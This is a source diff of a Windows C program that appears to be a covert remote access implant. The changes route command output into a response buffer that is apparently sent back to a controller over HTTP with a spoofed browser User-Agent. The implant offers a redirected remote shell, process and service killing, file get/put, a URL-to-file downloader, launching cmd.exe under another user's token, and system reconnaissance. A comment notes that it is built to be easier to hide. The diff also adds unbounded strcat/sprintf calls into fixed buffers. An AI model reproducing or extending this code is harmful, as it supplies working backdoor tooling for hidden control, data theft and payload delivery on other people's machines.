@@ -399,18 +399,22 @@ int start_shell(RedirectProcessIO *process)
 	return 0;
 }
 
-int list_processes()
+int list_processes(char *response)
 {
+	char output[4096] = { 0 };
+
 	HANDLE hndl = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPMODULE, 0);
 	if (hndl)
 	{
 		PROCESSENTRY32  process = { sizeof(PROCESSENTRY32) };
 		Process32First(hndl, &process);
-		printf("Process List:\n");
+		sprintf(output, "Process List:\n");
+		strcat(response, output);
 
 		do
 		{
-			printf("pid %8u:\t%s\n", process.th32ProcessID, process.szExeFile);
+			sprintf(output, "pid %8u:\t%s\n", process.th32ProcessID, process.szExeFile);
+			strcat(response, output);
 		} while (Process32Next(hndl, &process));
 
 		CloseHandle(hndl);
@@ -419,8 +423,11 @@ int list_processes()
 	return 0;
 }
 
-int list_services()
+int list_services(char *response)
 {
+	char output[4096] = { 0 };
+
+
 	LPENUM_SERVICE_STATUS_PROCESS pServiceList = NULL;
 
 	SC_HANDLE scMgr = OpenSCManager(
@@ -463,31 +470,36 @@ int list_services()
 				"SERVICE_PAUSED",
 			};
 
-			printf("Service List:\n");
+			sprintf(output, "Service List:\n");
+			strcat(response, output);
 			for (DWORD i = 0; i < cnt; i++)
 			{
-				printf("pid %8d:\t%-24s\t%-24s %-32s\n", services[i].ServiceStatusProcess.dwProcessId, &state_str[services[i].ServiceStatusProcess.dwCurrentState][0], services[i].lpServiceName, services[i].lpDisplayName);
+				sprintf(output, "pid %8d:\t%-24s\t%-24s %-32s\n", services[i].ServiceStatusProcess.dwProcessId, &state_str[services[i].ServiceStatusProcess.dwCurrentState][0], services[i].lpServiceName, services[i].lpDisplayName);
+				strcat(response, output);
 			}
 		}
 		CloseServiceHandle(scMgr);
 	}
 	else
 	{
-		printf("Could not open service manager.\n");
+		sprintf(output, "Could not open service manager.\n");
+		strcat(response, output);
 		return -1;
 	}
 
 	return 0;
 }
 
-BOOL TerminateProcess(DWORD dwProcessId, UINT uExitCode)
+BOOL TerminateProcess(DWORD dwProcessId, UINT uExitCode, char *response)
 {
+	char output[4096] = { 0 };
 	DWORD dwDesiredAccess = PROCESS_TERMINATE;
 	BOOL  bInheritHandle = FALSE;
 	HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
 	if (hProcess == NULL)
 	{
-		printf("Failed to open process\r\n");
+		sprintf(output, "Failed to open process %d\r\n", dwProcessId);
+		strcat(response, output);
 		return FALSE;
 	}
 
@@ -556,8 +568,10 @@ void RedirectIOToConsole(int debug)
 }
 
 
-int StopDependentServices(char *service_name)
+int StopDependentServices(char *service_name, char *response)
 {
+	char output[4096] = { 0 };
+
 	DWORD i;
 	DWORD dwBytesNeeded;
 	DWORD dwCount;
@@ -577,7 +591,8 @@ int StopDependentServices(char *service_name)
 
 	if (NULL == schSCManager)
 	{
-		printf("OpenSCManager failed (%d)\n", GetLastError());
+		sprintf(output, "OpenSCManager failed (%d)\n", GetLastError());
+		strcat(response, output);
 		return -1;
 	}
 
@@ -599,7 +614,9 @@ int StopDependentServices(char *service_name)
 	{
 		if (GetLastError() != ERROR_MORE_DATA)
 		{
-			printf("Unexpected error: ERROR_MORE_DATA false\n");
+			sprintf(output, "Unexpected error: ERROR_MORE_DATA false\n");
+			strcat(response, output);
+
 			return -1; // Unexpected error
 		}
 
@@ -617,7 +634,8 @@ int StopDependentServices(char *service_name)
 			// Enumerate the dependencies.
 			if (!EnumDependentServices(schService, SERVICE_ACTIVE, lpDependencies, dwBytesNeeded, &dwBytesNeeded, &dwCount))
 			{
-				printf("EnumDependentServices failed\r\n");
+				sprintf(output, "EnumDependentServices failed\r\n");
+				strcat(response, output);
 				return -1;
 			}
 
@@ -629,7 +647,8 @@ int StopDependentServices(char *service_name)
 
 				if (!hDepService)
 				{
-					printf("OpenService failed\r\n");
+					sprintf(output, "OpenService failed\r\n");
+					strcat(response, output);
 					return -1;
 				}
 
@@ -640,7 +659,8 @@ int StopDependentServices(char *service_name)
 						SERVICE_CONTROL_STOP,
 						(LPSERVICE_STATUS)&ssp))
 					{
-						printf("ControlService failed\r\n");
+						sprintf(output, "ControlService failed\r\n");
+						strcat(response, output);
 						return -1;
 					}
 
@@ -655,7 +675,8 @@ int StopDependentServices(char *service_name)
 							sizeof(SERVICE_STATUS_PROCESS),
 							&dwBytesNeeded))
 						{
-							printf("QueryServiceStatusEx failed\r\n");
+							sprintf(output, "QueryServiceStatusEx failed\r\n");
+							strcat(response, output);
 							return -1;
 						}
 
@@ -664,7 +685,8 @@ int StopDependentServices(char *service_name)
 
 						if (GetTickCount() - dwStartTime > dwTimeout)
 						{
-							printf("service stop timeout\r\n");
+							sprintf(output, "service stop timeout\r\n");
+							strcat(response, output);
 							return -1;
 						}
 					}
@@ -685,8 +707,9 @@ int StopDependentServices(char *service_name)
 	return 0;
 }
 
-int stop_service(char *service_name)
+int stop_service(char *service_name, char *response)
 {
+	char output[4096] = { 0 };
 	SERVICE_STATUS_PROCESS ssp;
 	DWORD dwStartTime = GetTickCount();
 	DWORD dwBytesNeeded;
@@ -702,7 +725,8 @@ int stop_service(char *service_name)
 
 	if (NULL == schSCManager)
 	{
-		printf("OpenSCManager failed (%d)\n", GetLastError());
+		sprintf(output, "OpenSCManager failed (%d)\n", GetLastError());
+		strcat(response, output);
 		return -1;
 	}
 
@@ -717,7 +741,8 @@ int stop_service(char *service_name)
 
 	if (schService == NULL)
 	{
-		printf("OpenService failed (%d)\n", GetLastError());
+		sprintf(output, "OpenService failed (%d)\n", GetLastError());
+		strcat(response, output);
 		CloseServiceHandle(schSCManager);
 		return -1;
 	}
@@ -731,7 +756,8 @@ int stop_service(char *service_name)
 		sizeof(SERVICE_STATUS_PROCESS),
 		&dwBytesNeeded))
 	{
-		printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
+		sprintf(output, "QueryServiceStatusEx failed (%d)\n", GetLastError());
+		strcat(response, output);
 		CloseServiceHandle(schService);
 		CloseServiceHandle(schSCManager);
 		return -1;
@@ -739,7 +765,8 @@ int stop_service(char *service_name)
 
 	if (ssp.dwCurrentState == SERVICE_STOPPED)
 	{
-		printf("Service is already stopped.\n");
+		sprintf(output, "Service is already stopped.\n");
+		strcat(response, output);
 		CloseServiceHandle(schService);
 		CloseServiceHandle(schSCManager);
 		return -1;
@@ -749,7 +776,8 @@ int stop_service(char *service_name)
 
 	while (ssp.dwCurrentState == SERVICE_STOP_PENDING)
 	{
-		printf("Service stop pending...\n");
+		sprintf(output, "Service stop pending...\n");
+		strcat(response, output);
 
 		// Do not wait longer than the wait hint. A good interval is 
 		// one-tenth of the wait hint but not less than 1 second  
@@ -771,7 +799,8 @@ int stop_service(char *service_name)
 			sizeof(SERVICE_STATUS_PROCESS),
 			&dwBytesNeeded))
 		{
-			printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
+			sprintf(output, "QueryServiceStatusEx failed (%d)\n", GetLastError());
+			strcat(response, output);
 			CloseServiceHandle(schService);
 			CloseServiceHandle(schSCManager);
 			return -1;
@@ -779,7 +808,8 @@ int stop_service(char *service_name)
 
 		if (ssp.dwCurrentState == SERVICE_STOPPED)
 		{
-			printf("Service stopped successfully.\n");
+			sprintf(output, "Service stopped successfully.\n");
+			strcat(response, output);
 			CloseServiceHandle(schService);
 			CloseServiceHandle(schSCManager);
 			return -1;
@@ -787,7 +817,8 @@ int stop_service(char *service_name)
 
 		if (GetTickCount() - dwStartTime > dwTimeout)
 		{
-			printf("Service stop timed out.\n");
+			sprintf(output, "Service stop timed out.\n");
+			strcat(response, output);
 			CloseServiceHandle(schService);
 			CloseServiceHandle(schSCManager);
 			return -1;
@@ -796,16 +827,14 @@ int stop_service(char *service_name)
 
 	// If the service is running, dependencies must be stopped first.
 
-	StopDependentServices(service_name);
+	StopDependentServices(service_name, response);
 
 	// Send a stop code to the service.
 
-	if (!ControlService(
-		schService,
-		SERVICE_CONTROL_STOP,
-		(LPSERVICE_STATUS)&ssp))
+	if (!ControlService( schService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp))
 	{
-		printf("ControlService failed (%d)\n", GetLastError());
+		sprintf(output, "ControlService failed (%d)\n", GetLastError());
+		strcat(response, output);
 		CloseServiceHandle(schService);
 		CloseServiceHandle(schSCManager);
 		return -1;
@@ -823,7 +852,8 @@ int stop_service(char *service_name)
 			sizeof(SERVICE_STATUS_PROCESS),
 			&dwBytesNeeded))
 		{
-			printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
+			sprintf(output, "QueryServiceStatusEx failed (%d)\n", GetLastError());
+			strcat(response, output);
 			CloseServiceHandle(schService);
 			CloseServiceHandle(schSCManager);
 			return -1;
@@ -834,20 +864,23 @@ int stop_service(char *service_name)
 
 		if (GetTickCount() - dwStartTime > dwTimeout)
 		{
-			printf("Wait timed out\n");
+			sprintf(output, "Wait timed out\n");
+			strcat(response, output);
 			CloseServiceHandle(schService);
 			CloseServiceHandle(schSCManager);
 			return -1;
 		}
 	}
-	printf("Service stopped successfully\n");
+	sprintf(output, "Service stopped successfully\n");
+	strcat(response, output);
 
 	return 0;
 }
 
 
-int  StartProcessAsUser(char *process_path, int pid, char *username)
+int StartProcessAsUser(char *process_path, int pid, char *username, char *response)
 {
+	char output[4096] = { 0 };
 	STARTUPINFO si = { 0 };
 	PROCESS_INFORMATION pi = {};
 
@@ -871,7 +904,8 @@ int  StartProcessAsUser(char *process_path, int pid, char *username)
 	if (ProcessHandle == (HANDLE)-1)
 	{
 		DWORD error = GetLastError();
-		printf("OpenProcess failed with %d!", error);
+		sprintf(output, "OpenProcess failed with %d!", error);
+		strcat(response, output);
 		return -1;
 	}
 
@@ -879,7 +913,8 @@ int  StartProcessAsUser(char *process_path, int pid, char *username)
 	if (bSuccess == 0)
 	{
 		DWORD error = GetLastError();
-		printf("OpenProcessToken Failed with %d!", error);
+		sprintf(output, "OpenProcessToken Failed with %d!", error);
+		strcat(response, output);
 		return -1;
 	}
 
@@ -893,13 +928,15 @@ int  StartProcessAsUser(char *process_path, int pid, char *username)
 	if (bSuccess == 0)
 	{
 		DWORD error = GetLastError();
-		printf("CreateProcessAsUserA failed with %d!", error);
+		sprintf(output, "CreateProcessAsUserA failed with %d!", error);
+		strcat(response, output);
 		CloseHandle(ProcessToken);
 		return -1;
 	}
 	else
 	{
-		printf("OK!");
+		sprintf(output, "OK!");
+		strcat(response, output);
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 	}
@@ -956,8 +993,9 @@ int request_admin(char *appname)
 
 
 
-int start_service(char *service_name)
+int start_service(char *service_name, char *response)
 {
+	char output[4096] = { 0 };
 	SERVICE_STATUS_PROCESS ssStatus;
 	DWORD dwOldCheckPoint;
 	DWORD dwStartTickCount;
@@ -972,7 +1010,8 @@ int start_service(char *service_name)
 
 	if (NULL == schSCManager)
 	{
-		printf("OpenSCManager failed (%d)\n", GetLastError());
+		sprintf(output, "OpenSCManager failed (%d)\n", GetLastError());
+		strcat(response, output);
 		return -1;
 	}
 
@@ -987,7 +1026,8 @@ int start_service(char *service_name)
 
 	if (schService == NULL)
 	{
-		printf("OpenService failed (%d)\n", GetLastError());
+		sprintf(output, "OpenService failed (%d)\n", GetLastError());
+		strcat(response, output);
 		CloseServiceHandle(schSCManager);
 		return -1;
 	}
@@ -1002,7 +1042,8 @@ int start_service(char *service_name)
 
 	if (NULL == schSCManager)
 	{
-		printf("OpenSCManager failed (%d)\n", GetLastError());
+		sprintf(output, "OpenSCManager failed (%d)\n", GetLastError());
+		strcat(response, output);
 		return -1;
 	}
 
@@ -1015,7 +1056,8 @@ int start_service(char *service_name)
 
 	if (schService == NULL)
 	{
-		printf("OpenService failed (%d)\n", GetLastError());
+		sprintf(output, "OpenService failed (%d)\n", GetLastError());
+		strcat(response, output);
 		CloseServiceHandle(schSCManager);
 		return -1;
 	}
@@ -1029,7 +1071,8 @@ int start_service(char *service_name)
 		sizeof(SERVICE_STATUS_PROCESS), // size of structure
 		&dwBytesNeeded))              // size needed if buffer is too small
 	{
-		printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
+		sprintf(output, "QueryServiceStatusEx failed (%d)\n", GetLastError());
+		strcat(response, output);
 		CloseServiceHandle(schService);
 		CloseServiceHandle(schSCManager);
 		return -1;
@@ -1040,7 +1083,8 @@ int start_service(char *service_name)
 
 	if (ssStatus.dwCurrentState != SERVICE_STOPPED && ssStatus.dwCurrentState != SERVICE_STOP_PENDING)
 	{
-		printf("Cannot start the service because it is already running\n");
+		sprintf(output, "Cannot start the service because it is already running\n");
+		strcat(response, output);
 		CloseServiceHandle(schService);
 		CloseServiceHandle(schSCManager);
 		return -1;
@@ -1077,7 +1121,8 @@ int start_service(char *service_name)
 			sizeof(SERVICE_STATUS_PROCESS), // size of structure
 			&dwBytesNeeded))              // size needed if buffer is too small
 		{
-			printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
+			sprintf(output, "QueryServiceStatusEx failed (%d)\n", GetLastError());
+			strcat(response, output);
 			CloseServiceHandle(schService);
 			CloseServiceHandle(schSCManager);
 			return -1;
@@ -1094,7 +1139,8 @@ int start_service(char *service_name)
 		{
 			if (GetTickCount() - dwStartTickCount > ssStatus.dwWaitHint)
 			{
-				printf("Timeout waiting for service to stop\n");
+				sprintf(output, "Timeout waiting for service to stop\n");
+				strcat(response, output);
 				CloseServiceHandle(schService);
 				CloseServiceHandle(schSCManager);
 				return -1;
@@ -1109,12 +1155,17 @@ int start_service(char *service_name)
 		0,           // number of arguments 
 		NULL))      // no arguments 
 	{
-		printf("StartService failed (%d)\n", GetLastError());
+		sprintf(output, "StartService failed (%d)\n", GetLastError());
+		strcat(response, output);
 		CloseServiceHandle(schService);
 		CloseServiceHandle(schSCManager);
 		return -1;
 	}
-	else printf("Service start pending...\n");
+	else
+	{
+		sprintf(output, "Service start pending...\n");
+		strcat(response, output);
+	}
 
 	// Check the status until the service is no longer start pending. 
 
@@ -1125,7 +1176,8 @@ int start_service(char *service_name)
 		sizeof(SERVICE_STATUS_PROCESS), // size of structure
 		&dwBytesNeeded))              // if buffer too small
 	{
-		printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
+		sprintf(output, "QueryServiceStatusEx failed (%d)\n", GetLastError());
+		strcat(response, output);
 		CloseServiceHandle(schService);
 		CloseServiceHandle(schSCManager);
 		return -1;
@@ -1160,7 +1212,8 @@ int start_service(char *service_name)
 			sizeof(SERVICE_STATUS_PROCESS), // size of structure
 			&dwBytesNeeded))              // if buffer too small
 		{
-			printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
+			sprintf(output, "QueryServiceStatusEx failed (%d)\n", GetLastError());
+			strcat(response, output);
 			break;
 		}
 
@@ -1184,15 +1237,21 @@ int start_service(char *service_name)
 	// Determine whether the service is running.
 	if (ssStatus.dwCurrentState == SERVICE_RUNNING)
 	{
-		printf("Service started successfully.\n");
+		sprintf(output, "Service started successfully.\n");
+		strcat(response, output);
 	}
 	else
 	{
-		printf("Service not started. \n");
-		printf("  Current State: %d\n", ssStatus.dwCurrentState);
-		printf("  Exit Code: %d\n", ssStatus.dwWin32ExitCode);
-		printf("  Check Point: %d\n", ssStatus.dwCheckPoint);
-		printf("  Wait Hint: %d\n", ssStatus.dwWaitHint);
+		sprintf(output, "Service not started. \n");
+		strcat(response, output);
+		sprintf(output, "  Current State: %d\n", ssStatus.dwCurrentState);
+		strcat(response, output);
+		sprintf(output, "  Exit Code: %d\n", ssStatus.dwWin32ExitCode);
+		strcat(response, output);
+		sprintf(output, "  Check Point: %d\n", ssStatus.dwCheckPoint);
+		strcat(response, output);
+		sprintf(output, "  Wait Hint: %d\n", ssStatus.dwWaitHint);
+		strcat(response, output);
 		CloseServiceHandle(schService);
 		CloseServiceHandle(schSCManager);
 		return -1;
@@ -1204,8 +1263,9 @@ int start_service(char *service_name)
 }
 
 
-void create_process_blocking(char *cmdline)
+void create_process_blocking(char *cmdline, char *response)
 {
+	char output[4096] = { 0 };
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 
@@ -1227,7 +1287,8 @@ void create_process_blocking(char *cmdline)
 		&pi)           // Pointer to PROCESS_INFORMATION structure
 		)
 	{
-		printf("CreateProcess failed (%d).\n", GetLastError());
+		sprintf(output, "CreateProcess failed (%d).\n", GetLastError());
+		strcat(response, output);
 		return;
 	}
 
@@ -1239,8 +1300,9 @@ void create_process_blocking(char *cmdline)
 	CloseHandle(pi.hThread);
 }
 
-void create_process_nonblocking(char *cmdline)
+void create_process_nonblocking(char *cmdline, char *response)
 {
+	char output[4096] = { 0 };
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 
@@ -1262,7 +1324,8 @@ void create_process_nonblocking(char *cmdline)
 		&pi)           // Pointer to PROCESS_INFORMATION structure
 		)
 	{
-		printf("CreateProcess failed (%d).\n", GetLastError());
+		sprintf(output, "CreateProcess failed (%d).\n", GetLastError());
+		strcat(response, output);
 		return;
 	}
 
@@ -1273,8 +1336,9 @@ void create_process_nonblocking(char *cmdline)
 
 
 
-int whoami(char *user, char *comp)
+int whoami(char *user, char *comp, char *response)
 {
+	char output[4096] = { 0 };
 	char username[1024];
 	char compname[1024];
 	DWORD username_size = 1024;
@@ -1282,19 +1346,23 @@ int whoami(char *user, char *comp)
 
 	if (!GetComputerName(compname, &username_size))
 	{
-		printf("GetComputerName failed\n");
+		sprintf(output, "GetComputerName failed\n");
+		strcat(response, output);
 		return -1;
 	}
 
 
 	if (!GetUserName(username, &compname_size))
 	{
-		printf("GetUserName failed\n");
+		sprintf(output, "GetUserName failed\n");
+		strcat(response, output);
 		return -1;
 	}
 
-	printf("User name:\t%s\n", username);
-	printf("Computer name:\t%s\n", compname);
+	sprintf(output, "User name:\t%s\n", username);
+	strcat(response, output);
+	sprintf(output, "Computer name:\t%s\n", compname);
+	strcat(response, output);
 
 	strcpy(user, username);
 	strcpy(comp, compname);
@@ -1485,8 +1553,9 @@ int query_wmi()
 
 
 // Gets registry keys under hKey
-void QueryKey(HKEY hKey)
+void QueryKey(HKEY hKey, char *response)
 {
+	char output[4096] = { 0 };
 	TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
 	DWORD    cbName;                   // size of name string 
 	TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name 
@@ -1553,7 +1622,7 @@ void QueryKey(HKEY hKey)
 					&hTestKey) == ERROR_SUCCESS
 					)
 				{
-					QueryKey(hTestKey);
+					QueryKey(hTestKey, response);
 				}
 			}
 		}
@@ -1582,7 +1651,10 @@ void QueryKey(HKEY hKey)
 			if (retCode == ERROR_SUCCESS && type == REG_SZ)
 			{
 				if (strstr(achValue, "DisplayName") != 0)
-					printf("\t%s: %s\n", achValue, data);
+				{
+					sprintf(output, "\t%s: %s\n", achValue, data);
+					strcat(response, output);
+				}
 			}
 			else if (retCode == ERROR_SUCCESS && type == REG_DWORD)
 			{
@@ -1593,7 +1665,7 @@ void QueryKey(HKEY hKey)
 }
 
 // Get list of installed applications on windows box from registry
-void ListInstalled()
+void ListInstalled(char *response)
 {
 	HKEY hTestKey;
 
@@ -1604,7 +1676,7 @@ void ListInstalled()
 		&hTestKey) == ERROR_SUCCESS
 		)
 	{
-		QueryKey(hTestKey);
+		QueryKey(hTestKey, response);
 	}
 
 	RegCloseKey(hTestKey);
@@ -1612,35 +1684,37 @@ void ListInstalled()
 
 
 
-int get_url(char *url, char *path)
+int get_url(char *url, char *path, char *response)
 {
+	char output[4096] = { 0 };
 	HRESULT hr = URLDownloadToFile((LPUNKNOWN)0x0, url, path, 0, (LPBINDSTATUSCALLBACK)0x0);
 
 	if (hr != S_OK)
 	{
-		printf("URLDownloadToFile failed\n");
+		sprintf(output, "URLDownloadToFile failed\n");
+		strcat(response, output);
 	}
 
 	return 0;
 }
 
-int list_process_or_service(BOOL process)
+int list_process_or_service(BOOL process, char *response)
 {
 	if (process)
 	{
-		list_processes();
+		list_processes(response);
 	}
 	else
 	{
-		list_services();
+		list_services(response);
 	}
 
 	return 0;
 }
 
-int kill_process(int pid, int exit_code)
+int kill_process(int pid, int exit_code, char *response)
 {
-	TerminateProcess(pid, exit_code);
+	TerminateProcess(pid, exit_code, response);
 	return 0;
 }
 
@@ -1654,31 +1728,31 @@ int putf()
 	return 0;
 }
 
-int start_process_or_service(BOOL process, char *cmdline)
+int start_process_or_service(BOOL process, char *cmdline, char *response)
 {
 
 	if (process)
 	{
-		create_process_nonblocking(cmdline);
+		create_process_nonblocking(cmdline, response);
 	}
 	else
 	{
-		start_service(cmdline);
+		start_service(cmdline, response);
 	}
 
 	return 0;
 }
 
-int stop_process_or_service(BOOL process, char *cmdline, int pid)
+int stop_process_or_service(BOOL process, char *service_name, int pid, char *response)
 {
 
 	if (process)
 	{
-		TerminateProcess(pid, 0);
+		TerminateProcess(pid, 0, response);
 	}
 	else
 	{
-		stop_service(cmdline);
+		stop_service(service_name, response);
 	}
 
 	return 0;
@@ -1689,7 +1763,7 @@ int stop_process_or_service(BOOL process, char *cmdline, int pid)
 int list_volumes(char *response)
 {
 	// May use 2-D array for char. This program compiled for wide char/unicode
-	char output[8192] = { 0 };
+	char output[4096] = { 0 };
 
 	LPCSTR drive[26] = {
 		"A:\\",
@@ -1804,7 +1878,7 @@ int list_volumes(char *response)
 }
 
 
-int parse_command(char *cmdline, int &cmd, int &process, int &pid, char *host, char *uri, char *url, char *path, char *start_cmdline)
+int parse_command(char *cmdline, int &cmd, int &process, int &pid, char *service_name, char *host, char *uri, char *url, char *path, char *start_cmdline)
 {
 	if (strstr(cmdline, "shell") != 0)
 	{
@@ -1831,10 +1905,16 @@ int parse_command(char *cmdline, int &cmd, int &process, int &pid, char *host, c
 		if (strstr(cmdline, "/p") != 0)
 		{
 			process = 1;
+
+			sscanf(cmdline, "kill /p %d", &pid);
+
 		}
 		else if (strstr(cmdline, "/s") != 0)
 		{
 			process = 0;
+
+			sscanf(cmdline, "kill /s %s", service_name);
+
 		}
 	}
 	else if (strstr(cmdline, "getf") != 0)
@@ -1844,19 +1924,6 @@ int parse_command(char *cmdline, int &cmd, int &process, int &pid, char *host, c
 	else if (strstr(cmdline, "putf") != 0)
 	{
 		cmd = 4;
-	}
-	else if (strstr(cmdline, "kill") != 0)
-	{
-		cmd = 5;
-
-		if (strstr(cmdline, "/p") != 0)
-		{
-			process = 1;
-		}
-		else if (strstr(cmdline, "/s") != 0)
-		{
-			process = 0;
-		}
 	}
 	else if (strstr(cmdline, "whoami") != 0)
 	{
@@ -1882,6 +1949,14 @@ int parse_command(char *cmdline, int &cmd, int &process, int &pid, char *host, c
 	{
 		cmd = 11;
 	}
+	else if (strstr(cmdline, "installs") != 0)
+	{
+		cmd = 12;
+	}
+	else if (strstr(cmdline, "help") != 0)
+	{
+		cmd = 13;
+	}
 
 
 	return 0;
@@ -1891,11 +1966,50 @@ int parse_command(char *cmdline, int &cmd, int &process, int &pid, char *host, c
 RedirectProcessIO shell_process;
 
 
+void help(char *response)
+{
+	char output[4096] = { 0 };
+
+	sprintf(output, "0 shell\n");
+	strcat(response, output);
+	sprintf(output, "1 list [/p|/s]\n");
+	strcat(response, output);
+	sprintf(output, "2 kill [/p|/s]\n");
+	strcat(response, output);
+	sprintf(output, "3 getf [file]\n");
+	strcat(response, output);
+	sprintf(output, "4 putf [file]\n");
+	strcat(response, output);
+	sprintf(output, "5 whoami\n");
+	strcat(response, output);
+	sprintf(output, "6 quit\n");
+	strcat(response, output);
+	sprintf(output, "7 v\n");
+	strcat(response, output);
+	sprintf(output, "8 ??? some numbers or something\n");
+	strcat(response, output);
+	sprintf(output, "9 runpid\n");
+	strcat(response, output);
+	sprintf(output, "10 geturl\n");
+	strcat(response, output);
+	sprintf(output, "11 disk\n");
+	strcat(response, output);
+	sprintf(output, "12 installs\n");
+	strcat(response, output);
+	sprintf(output, "13 help\n");
+	strcat(response, output);
+
+
+}
+
+
 int process_command(char *cmdline, char *headers, char *response)
 {
 	int cmd = -1;
 	int process = -1;
 	int pid = -1;
+
+	char service_name[4096] = { 0 };
 
 	char host[4096] = { 0 };		// domain name, eg: www.awright2009.com
 	char uri[4096] = { 0 };			// get URI, eg: /index.html
@@ -1920,7 +2034,7 @@ int process_command(char *cmdline, char *headers, char *response)
 		ret = shell_process.read(shell_buffer, shell_length);
 
 		strcat(response, shell_buffer);
-		printf("%s", shell_buffer);
+		//printf("%s", shell_buffer);
 
 		strcat(cmdline, "\n");
 		ret = shell_process.write(cmdline);
@@ -1935,7 +2049,7 @@ int process_command(char *cmdline, char *headers, char *response)
 		memset(shell_buffer, 0, shell_length);
 		ret = shell_process.read(shell_buffer, shell_length);
 		strcat(response, shell_buffer);
-		printf("%s", shell_buffer);
+		//printf("%s", shell_buffer);
 
 		if (ret != 0)
 		{
@@ -1949,7 +2063,7 @@ int process_command(char *cmdline, char *headers, char *response)
 		memset(shell_buffer, 0, shell_length);
 		ret = shell_process.read(shell_buffer, shell_length);
 		strcat(response, shell_buffer);
-		printf("%s", shell_buffer);
+		//printf("%s", shell_buffer);
 
 		if (ret != 0)
 		{
@@ -1964,7 +2078,7 @@ int process_command(char *cmdline, char *headers, char *response)
 
 	// convert command line string into the various parameters for the commands
 	// for shell mode we'll have to pass the data straight through until the shell exits
-	int ret = parse_command(cmdline, cmd, process, pid, host, uri, url, path, new_cmdline);
+	int ret = parse_command(cmdline, cmd, process, pid, service_name, host, uri, url, path, new_cmdline);
 
 
 	switch (cmd)
@@ -1978,10 +2092,10 @@ int process_command(char *cmdline, char *headers, char *response)
 		shell_mode = 1;
 		break;
 	case 1:
-		list_process_or_service(process);
+		list_process_or_service(process, response);
 		break;
 	case 2:
-		stop_process_or_service(process, new_cmdline, pid);
+		stop_process_or_service(process, service_name, pid, response);
 		break;
 	case 3:
 	{
@@ -2000,12 +2114,12 @@ int process_command(char *cmdline, char *headers, char *response)
 	}
 	case 5:
 		if (process)
-			create_process_nonblocking(cmdline);
+			create_process_nonblocking(cmdline, response);
 		else
-			start_service(cmdline);
+			start_service(cmdline, response);
 		break;
 	case 6:
-		whoami(user, comp);
+		whoami(user, comp, response);
 		break;
 	case 7:
 		// quit
@@ -2014,17 +2128,21 @@ int process_command(char *cmdline, char *headers, char *response)
 		//20111117 and flush or something
 		break;
 	case 9:
-		StartProcessAsUser("c:\\Windows\\System32\\cmd.exe", 0, "awright");// start process as user
+		StartProcessAsUser("c:\\Windows\\System32\\cmd.exe", 0, "awright", response);// start process as user
 		break;
 	case 10:
 	{
-		int ret = get_url(url, path);
+		int ret = get_url(url, path, response);
 		break;
 	}
 	case 11:
 		list_volumes(response);
 		break;
 	case 12:
+		ListInstalled(response);
+		break;
+	case 13:
+		help(response);
 		break;
 	}
 
@@ -2127,7 +2245,7 @@ int trim_characters(char *data, int length, char *char_list, int list_length)
 }
 
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR     lpCmdLine,        int       nShowCmd)
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
 {
 	char user[4096] = { 0 };
 	char comp[4096] = { 0 };
@@ -2145,7 +2263,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR     lpCmd
 	// just open a console so we can printf, this is technically a windows app, I suppose so it's easier to hide?
 	RedirectIOToConsole(1);
 
-	whoami(user, comp);
+	whoami(user, comp, response);
 	sprintf(headers, "User-Agent: Mozilla/5.0\r\nAccept:*/*\r\nPragma:no-cache\r\n\r\n\r\n");
 
 
